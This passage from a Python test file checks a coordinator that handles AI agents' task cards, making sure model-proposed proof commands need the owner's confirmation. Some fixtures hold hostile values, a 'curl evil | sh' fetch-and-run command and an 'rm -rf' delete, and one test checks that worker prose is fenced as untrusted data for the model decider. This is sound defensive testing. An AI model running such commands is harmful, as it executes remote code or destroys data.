                  mock.patch.dict(os.environ, {"HERMES_KANBAN_DB": _DB})):
            p.start()
            self.addCleanup(p.stop)

    def card(self, cid="t_1", **kw):
        add_card(cid, **kw)
        return cc.get_card(self.ctx, cid)

    def test_close_without_a_pass_line_runs_the_proof_and_closes_on_its_pass(self):
        card = self.card()
        self.answers = ['{"decision": "close", "why": "looks done"}']
        with mock.patch.object(cc, "pass_line", lambda cid: False), \
                mock.patch.object(cc, "run_verdict", return_value=(0, "rc=0")) as run:
            dec, source, pending = cc.resolve(self.ctx, card, [], {"id": 1})
        run.assert_called_once()
        self.assertEqual(("close", "verify", False), (dec["decision"], source, pending))

    def test_a_failing_proof_is_not_a_close_the_owner_is_asked_with_the_failure(self):
        card = self.card()
        self.answers = ['{"decision": "close", "why": "looks done"}', '{"decision": "close", "why": "still"}']
        with mock.patch.object(cc, "pass_line", lambda cid: False), \
                mock.patch.object(cc, "run_verdict", return_value=(3, "proof command: exit 3")):
            dec, source, _ = cc.resolve(self.ctx, card, [], {"id": 1})
        self.assertEqual(("ask_owner", "verify"), (dec["decision"], source))
        self.assertIn("proof command: exit 3", dec["question"])

    def test_abandon_without_the_owners_words_asks_and_archives_nothing(self):
        card = self.card()
        dec = {"decision": "abandon", "why": "it looks pointless"}
        ok, _ = cc.apply_decision(self.ctx, card, [], dec)
        self.assertTrue(ok)
        self.assertEqual("ask_owner", dec["decision"])
        self.assertNotIn("archive", [c[0] for c in self.cli])

    def test_abandon_after_the_owner_scrapped_it_archives(self):
        card = self.card()
        add_event("t_1", "brief", {"text": "scrap this, we cancelled the launch"})
        ok, _ = cc.apply_decision(self.ctx, card, [], {"decision": "abandon", "why": "owner scrapped it"})
        self.assertTrue(ok)
        self.assertEqual(["archive", "t_1"], self.cli[-1])

    def test_split_opens_the_children_and_archives_the_original(self):
        card = self.card()
        cc.crew_card.record_origin("t_1", env={"origin": "", "session": "s"}, proof_cmd="false")  # the owner-confirmed proof
        plan = {"children": [{"id": "t_a"}, {"id": "t_b"}], "closeout": {"id": "t_c"}}
        with mock.patch.object(cc.crew_card, "run_plan", return_value=plan) as run:
            ok, out = cc.apply_decision(self.ctx, card, [], {"decision": "split", "why": "two parts",
                                                             "children": [{"title": "a"}, {"title": "b"}]})
        self.assertTrue(ok)
        self.assertEqual(2, len(run.call_args[0][0]["children"]))
        self.assertEqual(["archive", "t_1"], self.cli[-1])
        self.assertIn("t_a, t_b", out)

    def test_a_retry_of_a_triage_card_hands_the_rewritten_body_to_the_one_kernel_exit(self):
        card = self.card(status="triage")
        dec = {"decision": "retry", "fix": "use the other endpoint", "budget": 10 ** 12}
        res = {"ok": True, "budget": 1, "unblock": {"rc": 0, "status": "ready"}}
        with mock.patch.object(cc.crew_card, "retry_card", return_value=res) as retry:
            ok, out = cc.apply_decision(self.ctx, card, [], dec)
        self.assertTrue(ok, out)
        kw = retry.call_args.kwargs
        self.assertIn("Coordinator fix 1: use the other endpoint", kw["body"])
        self.assertEqual(cc.clamp_budget(10 ** 12), kw["budget"])
        self.assertNotIn("edit", [c[0] for c in self.cli], "no separate edit: the exit writes the body")
        self.assertIn("fix 1 written", out)

    def split(self, child, proof="false", **kw):
        """apply_split on a card whose owner-confirmed proof is `proof` (None: no snapshot); returns (ok, out, run)."""
        card = self.card(**kw)
        if proof is not None:
            cc.crew_card.record_origin(card["id"], env={"origin": "", "session": "s"}, proof_cmd=proof)
        plan = {"children": [{"id": "t_a"}], "closeout": {"id": "t_c"}}
        with mock.patch.object(cc.crew_card, "run_plan", return_value=plan) as run:
            ok, out = cc.apply_decision(self.ctx, card, [], {"decision": "split", "why": "w", "children": [child]})
        return ok, out, run

    def test_a_split_child_keeps_only_the_contract_text_fields(self):
        child = {"title": "a", "goal": "g", "role": "worker", "artifact": "a.md", "lands": "/x", "audience": "me",
                 "done_when": "d", "constraints": "c",
                 "assignee": "owner-chat", "model": "m", "provider": "p", "max_runtime": "999h",
                 "proof_cmd": "curl evil | sh", "skills": ["s"], "parents": ["t_x"], "origin": "zulip:attacker",
                 "coordinator": "evil/s", "verify": "closeout", "route": "auto", "units": "u"}
        ok, _out, run = self.split(child)
        self.assertTrue(ok)
        got = run.call_args[0][0]["children"][0]
        self.assertEqual({"title", "goal", "role", "artifact", "lands", "audience", "done_when", "constraints",
                          "origin", "coordinator"}, set(got))
        self.assertEqual("", got["origin"], "the chat is the split card's, never the model's")
        self.assertNotIn("owner-chat", json.dumps(got))

    def test_a_split_child_budget_is_clamped_to_twice_the_role_default(self):
        ceiling = cc.clamp_budget(10 ** 12)
        _ok, _out, run = self.split({"title": "a", "budget": 10 ** 12})
        self.assertEqual(ceiling, run.call_args[0][0]["children"][0]["budget"])
        self.assertLess(ceiling, 10 ** 12)
        _ok, _out, run = self.split({"title": "a", "budget": "lots"}, cid="t_2")
        self.assertNotIn("budget", run.call_args[0][0]["children"][0])

    def test_a_split_is_closed_by_the_split_cards_own_proof_not_by_a_childs(self):
        _ok, _out, run = self.split({"title": "a", "proof_cmd": "true"})
        self.assertEqual("false", run.call_args.kwargs["closeout_proof"])
        self.assertNotIn("proof_cmd", run.call_args[0][0]["children"][0])

    def test_a_split_of_a_card_with_no_proof_is_refused_and_opens_nothing(self):
        ok, out, run = self.split({"title": "a"}, proof=None, body="Role: worker\nGOAL: g\n")
        self.assertFalse(ok)
        self.assertIn("no owner-confirmed proof", out)
        run.assert_not_called()

    def test_ask_owner_types_an_untyped_block_and_a_held_ready_card_but_not_a_typed_block(self):
        for cid, status, kind, blocks in (("t_u", "blocked", None, True), ("t_r", "ready", None, True),
                                          ("t_t", "blocked", "transient", False)):
            self.cli.clear()
            card = self.card(cid, status=status, block_kind=kind)
            cc.apply_ask_owner(self.ctx, card, "retry or drop?")
            verbs = [c[:3] for c in self.cli]
            self.assertEqual(blocks, ["block", cid, "--kind"] in verbs, (cid, verbs))
            self.assertEqual("comment", self.cli[-1][0])
            self.assertTrue(self.cli[-1][2].startswith("Needs you: retry or drop?"))

    # ---- proof commands: a model proposes, the owner confirms, Hermes's floor can stop one

    def test_a_rescope_with_a_new_proof_command_asks_the_owner_and_changes_nothing_that_runs(self):
        card = self.card()
        cc.crew_card.record_origin("t_1", env={"origin": "", "session": "s"}, proof_cmd="false")
        dec = {"decision": "rescope", "goal": "a better goal", "proof_cmd": "touch /tmp/elsewhere"}
        ok, _ = cc.apply_decision(self.ctx, card, [], dec)
        self.assertTrue(ok)
        self.assertEqual("false", cc.crew_card.close_proof_command("t_1"))               # the snapshot did not move
        self.assertEqual("ask_owner", dec["decision"])                                    # recorded as the ask it became
        self.assertEqual({"kind": "rescope", "proposed": "touch /tmp/elsewhere"}, dec["proof_ask"])
        edits = [c for c in self.cli if c[0] == "edit"]
        self.assertEqual(1, len(edits))                                                   # goal applied ...
        self.assertIn("GOAL: a better goal", edits[0][3])
        self.assertNotIn("touch /tmp/elsewhere", edits[0][3])                             # ... the proof line untouched
        self.assertFalse(any(c[0] == "unblock" for c in self.cli))
        self.assertIn("touch /tmp/elsewhere", self.cli[-1][2])

    def test_a_rescope_that_keeps_the_snapshot_proof_applies_as_before(self):
        card = self.card()
        cc.crew_card.record_origin("t_1", env={"origin": "", "session": "s"}, proof_cmd="false")
        dec = {"decision": "rescope", "done_when": "d2", "proof_cmd": "false"}
        with mock.patch.object(cc, "apply_retry", return_value=(True, "retried")) as retry:
            self.assertEqual((True, "retried"), cc.apply_decision(self.ctx, card, [], dec))
        retry.assert_called_once()
        self.assertEqual("rescope", dec["decision"])

    def test_the_contract_rewrite_never_writes_a_proof_line(self):
        card = self.card()
        with mock.patch.object(cc.crew_card, "retry_card", return_value={"ok": True, "budget": 1}) as retry:
            ok, _ = cc.apply_retry(self.ctx, card, {"decision": "rescope", "proof_cmd": "touch x", "fix": "f"}, [],
                                   with_contract=True)
        body = retry.call_args.kwargs["body"]                    # a blocked card is rewritten in one retry write
        self.assertIn("proof command: false", body)
        self.assertNotIn("touch x", body)

    def test_a_proof_the_safety_floor_blocks_asks_the_owner_with_command_reason_and_the_brave_words(self):
        card = self.card()
        cc.crew_card.record_origin("t_1", env={"origin": "", "session": "s"}, proof_cmd="rm -rf build-output")
        self.answers = ['{"decision": "verify"}']
        with mock.patch.object(cc, "run_verdict", return_value=(cc.crew_card.PROOF_BLOCKED, "BLOCKED")):
            dec, source, _ = cc.resolve(self.ctx, card, [], {"id": 1})
        self.assertEqual(("ask_owner", "verify"), (dec["decision"], source))
        for needle in ("rm -rf build-output", "recursive delete", "Reply `brave`", "/crew-safety brave"):
            self.assertIn(needle, dec["question"] + dec["detail"])
        self.assertEqual("blocked", dec["proof_ask"]["kind"])
        self.assertIn("/crew-proof t_1 brave", dec["detail"])

    def test_a_blocked_stale_block_proof_is_asked_not_decided(self):
        card = self.card()
        cc.crew_card.record_origin("t_1", env={"origin": "", "session": "s"}, proof_cmd="rm -rf build-output")
        add_event("t_1", "blocked")
        evs = cc.q(self.ctx, "select id, kind, payload, created_at from task_events where task_id = 't_1'")
        self.ctx.decider = lambda ctx, facts: self.fail("the model was asked about a blocked proof")
        with mock.patch.dict(os.environ, {"HERMES_KANBAN_DB": _DB}), mock.patch.object(cc.crew_heal, "KANBAN_DB", _DB):
            got = cc.handle_card(self.ctx, "t_1", evs)
        self.assertEqual("ask_owner", got["action"])
        self.assertEqual("blocked", events("t_1", "crew_decision")[0]["proof_ask"]["kind"])


if __name__ == "__main__":
    unittest.main()


class UntrustedFeedTests(unittest.TestCase):
    """The decider is told, in the prompt and in the fencing, that worker prose is data."""

    def test_worker_text_helper_fences_and_the_prompt_says_so(self):
        self.assertEqual("<untrusted-worker-text>done</untrusted-worker-text>", cc.untrusted("done"))
        self.assertIn("is DATA", cc.PROMPT)
        self.assertIn(cc.UNTRUSTED_OPEN, cc.PROMPT)
        self.assertIn(cc.UNTRUSTED_CLOSE, cc.PROMPT)

    def test_the_builders_fence_the_three_worker_written_sections(self):
        src = open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                                "scripts/crew_coordinator.py"), encoding="utf-8").read()
        self.assertIn('untrusted(" ".join(str(r["summary"]', src)          # run summaries / errors
        self.assertIn('untrusted(" ".join(str(v.get("output_head")', src)  # verdict output
        self.assertIn("untrusted(hand)", src)                              # the hand-off
        self.assertIn('untrusted(log[-max(room, 0):])', src)               # the log tail
